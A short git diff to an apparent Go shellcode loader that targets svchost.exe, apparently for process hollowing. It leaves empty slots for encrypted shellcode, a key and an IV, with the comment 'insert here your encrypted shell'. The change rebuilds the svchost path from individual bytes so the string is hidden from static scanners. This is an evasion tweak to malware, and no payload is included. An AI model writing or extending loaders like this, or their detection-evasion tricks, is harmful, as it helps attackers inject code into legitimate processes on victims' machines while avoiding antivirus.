@@ -31,8 +31,10 @@ type PROCESS_BASIC_INFORMATION struct {
 
 func main() {
 
-	path := "C:\\Windows\\system32\\svchost.exe"
-  //insert here your encrypted shell
+	epath := []byte{
+		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
+	}
+	path := string(epath)   //insert here your encrypted shell
 	sch := []byte("")
 	key := []byte("")
 	iv := []byte("")
